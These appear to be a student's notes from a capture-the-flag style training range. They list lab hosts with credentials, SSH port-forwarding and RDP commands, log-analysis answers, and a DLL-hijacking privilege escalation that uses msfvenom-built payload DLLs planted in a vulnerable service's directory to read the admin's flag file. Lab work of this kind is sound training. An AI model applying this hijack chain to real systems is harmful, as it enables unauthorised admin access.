Pivot
Hostname: ftp.site.donovia
IP: 192.168.28.105
OS: Ubuntu 18.04
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222
Malware: none
Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.

T1
Hostname: donovian-windows-private
IP: 192.168.28.5
OS: Windows ver: Unknown
Creds: comrade :: StudentPrivPassword
Last Known Ports: 3389
PSP: unknown
Malware: unknown
Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.


97dGQEcQWgSxAzo

student@lin-ops:~$ ssh -S /tmp/gray gray -O forward -L 1470:192.168.28.105:2222
student@lin-ops:~$ ssh -MS /tmp/orange comrade@0.0.0.0 -p 1470
student@lin-ops:~$ ssh -S /tmp/orange orange -O forward -L 4175:192.168.28.5:3389
student@lin-ops:~$ xfreerdp /u:comrade /v:0.0.0.0:4175 -dynamic-resolution +glyph-cache +clipboard /size:1080x1080

What service is causing a error level log for 31 May between 1200-1330 hrs. System log file is located under comrade's directory.
look in event viewer and filter on error and click on different ones
Using the same "system.evtx" log, what was the date the offending service was first created? Provide answer in the following format: YYYY-MM-DD
look at other logs with same event id
Using the same "system.evtx" log, The system time has changed, what is the new year?
clear filter and look at hop between years
What type of escalation can you perform with your findings?
because it is not able to rename but can write to directory = dll hijacking
What is the name of the DLL that is supposed to be loaded, by the vulnerable service?
look inside the .txt that is in the directory
Correct code in order to escalate your privileges. What you seek is waiting on the Admins Desktop.
on linops run
`msfvenom -p windows/exec CMD='cmd.exe /c "dir C:\Users\Admin\Desktop" > C:\Users\comrade.WIN2-INTERNAL-D\Desktop\blueballz.txt' -f dll > hijackmeplz.dll`
on windows machine run scp command: 
cd into desktop
`scp student@10.50.31.3:hijackmeplz.dll .`
now move the dll into the directory and restart device
open the blueballs.txt you made to see the listing 
now:
on lin ops
`msfvenom -p windows/exec CMD='cmd.exe /c "type C:\Users\Admin\Desktop\flag.txt" > C:\Users\comrade.WIN2-INTERNAL-D\Desktop\blueballz2.txt' -f dll > hijackmeplz.dll`
on windows
`scp student@10.50.31.3:hijackmeplz.dll .`
rename the frist dll you used and now move the dll into the directory and restart device
you will find the flag in blueballz2.txt
